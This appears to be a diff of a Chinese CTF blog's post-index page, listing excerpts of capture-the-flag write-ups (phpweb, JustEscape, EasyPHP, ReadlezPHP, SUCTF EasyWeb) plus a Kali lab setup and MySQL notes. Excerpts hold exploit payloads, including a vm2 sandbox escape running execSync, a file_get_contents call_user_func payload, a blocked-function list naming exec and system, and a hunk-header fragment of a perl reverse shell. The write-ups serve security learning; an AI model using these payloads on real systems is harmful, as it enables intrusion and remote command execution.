@@ -141,6 +141,206 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/">
+        <p class="h4 index-header">实验环境 vmware12 + KALI2020.2</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">实验环境 vmware12 + KALI2020.2一：导入XP系统
+1过程
+
+在 Workstation Pro 中，选择文件 &gt; 打开。
+
+浏览到 .ovf 或 .ova 文件，然后单击打开。
+
+键入虚拟机名称，再键入或浏览至虚拟机文件目录，然后单击导入。
+Workstation Pro 会执行 OVF 规范一致性和虚拟硬件合规性检查。状态栏中会显示导入进度。
+
+如果导入失败，可单击重试重新尝试操作，或者单击取消以取消导入。
+如果重新尝试导入，Workstation Pro 会放宽 OVF 规范一致性与虚拟硬件合规性检查，但您可能无法使用 Workstation Pro 中的虚拟机。
+
+
+二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）同时关闭XP的防火墙。
+对win10进行设置：
+
+
+二（补充）：如果无法点击高级设置。就搜索防火墙
+
+
+三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式【按住ctrl左键点击vm8和可以联网的网卡，右键vm8点击桥接。会出现新的网卡。右键新的网络，点击“属性“，找到“IPv4”，打开其”属性“，默认为自</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-30&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/20/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/">
+        <p class="h4 index-header">[网鼎杯 2020 朱雀组]phpweb</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[网鼎杯 2020 朱雀组]phpwebfuzz一下发现报错信息中有call_user_func()。但是我太菜了绕不过。用payload：
+
+func=file_get_contents&amp;p=index.php
+
+看一下源码
+&lt;?php
+    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;c</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-20&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/19/%5BZer0pts2020%5DCan%20you%20guess%20it/">
+        <p class="h4 index-header">[Zer0pts2020]Can you guess it</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[Zer0pts2020]Can you guess it?可以看到有一个随机数，如果能够破解随机数就能得到flag，在这里卡了半天也没做出来：
+
+
+
+
+  
+    
+    Can you guess it?
+  
+
+  
+    Can you guess it?
+    If your guess is correct, I'll give you the flag.
+    Source
+    
+
+    
+
+    
+      
+      
+    
+  
+
+
+当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾
+/config\.</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-19&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/17/%5BHFCTF2020%5DJustEscape/">
+        <p class="h4 index-header">[HFCTF2020]JustEscape</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[HFCTF2020]JustEscape最近老遇到js的题目，表示完全不会。
+看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。
+这是网上的payload：
+&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function(){
+    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+    try{
+        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+    }catch(e){
+        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-17&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/13/%5BXNUCA2019Qualifier%5DEasyPHP/">
+        <p class="h4 index-header">[XNUCA2019Qualifier]EasyPHP</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[XNUCA2019Qualifier]EasyPHP
+解法一
+[1、error_log结合log_errors自定义错误日志]
+[2、include_path设置包含路径]
+[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]
+[4、# \ 绕过.htaccess中多余字符]
+
+
+解法二
+[5、.htaccess配置prce绕过正则匹配]
+
+
+[解法三]
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-13&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/">
         <p class="h4 index-header">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</p>
         
@@ -389,234 +589,11 @@ perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(</div>
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/">
-        <p class="h4 index-header">BUUCTF misc部分解题</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">BUUCTF misc部分解题N种方法解决是个exe文件利用file进行查看
-
-$ file KEY.exeKEY.exe: ASCII text, with very long lines, with no line terminators
-
-将后缀名改为txt。
-bases64解密然后改为png，发现没有用。
-直接复制到url栏试试看。扫描二维码就可以了。
-大白
-IHDR后面的8个字节为图片的宽高修改宽高，就出现了flag。
-基础破解根据提示，是压缩包破解的事情。直接爆破,在kali中输入。
-
-1、安装rarcrack
-apt-get install rarcrack
-2、指定文件进行爆破，其中type有 rar、zip、7z 三种类型
-rarcrack 文件名 --threads 50 --type rar
-
-爆破出来是
-
-ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=
-
-flag{70354300a5100ba78068805661b93a5c}
-你竟然赶我走用png打开图片，winhex打开直接就发现了。
-
-flag{</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-30&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/">
-        <p class="h4 index-header">MySQL基础课堂笔记</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">今日内容
-数据库的基本概念
-
-
-MySQL数据库软件
-
-安装
-卸载
-配置
-
-
-SQL
-
-
-数据库的基本概念1. 数据库的英文单词： DataBase 简称 ： DB
-2. 什么数据库？
-    * 用于存储和管理数据的仓库。
-
-3. 数据库的特点：
-    1. 持久化存储数据的。其实数据库就是一个文件系统
-    2. 方便存储和管理数据
-    3. 使用了统一的方式操作数据库 -- SQL​    4. 常见的数据库软件        * 参见《MySQL基础.pdf》
-MySQL数据库软件1. 安装
-    * 参见《MySQL基础.pdf》
-2. 卸载
-    1. 去mysql的安装目录找到my.ini文件
-        * 复制 datadir=&quot;C:/ProgramData/MySQL/MySQL Server 5.5/Data/&quot;
-    2. 卸载MySQL
-    3. 删除C:/ProgramData目录下的MySQL文件夹。
-
-3. 配置
-    * MySQL服务启动
-        1. 手动。
-        2. cmd--&gt</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-29&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/25/%5BNPUCTF2020%5DReadlezPHP/">
-        <p class="h4 index-header">[NPUCTF2020]ReadlezPHP</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">[NPUCTF2020]ReadlezPHP首先打开页面观看源码发现了有个隐藏的链接。
-
-/time.php?source
-
-进去后就发现了源码，很明显是PHP的反序列化漏洞。
-&lt;?php
-#error_reporting(0);
-class HelloPhp
-{
-    public $a;
-    public $b;
-    public function __construct(){
-        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
-        $this-&gt;b = &quot;date&quot;;
-    }
-    public function __destruct(){
-        $a = $this-&gt;a;
-        $b = $this-&gt;b;
-        echo $b($a);
-    }
-}
-$c = new HelloPhp;
-
-if(isset($_GET[&#39;source&#39;]))
-{
-    highlight_file(__FILE__);
-    </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-25&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-        <p class="h4 index-header">Apache SSI 远程命令执行漏洞</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Apache SSI 远程命令执行漏洞链接：
-https://www.cnblogs.com/yuzly/p/11226439.html
-当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。
-使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-20&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/19/%5BSUCTF%202019%5DEasyWeb/">
-        <p class="h4 index-header">[SUCTF 2019]EasyWeb</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">[SUCTF 2019]EasyWeb题目源码
-&lt;?php
-function get_the_flag(){
-    // webadmin will remove your upload file every 20 min!!!! 
-    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
-    if(!file_exists($userdir)){
-    mkdir($userdir);
-    }
-    if(!empty($_FILES[&quot;file&quot;])){
-        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
-        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
-        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
-  </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-19&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
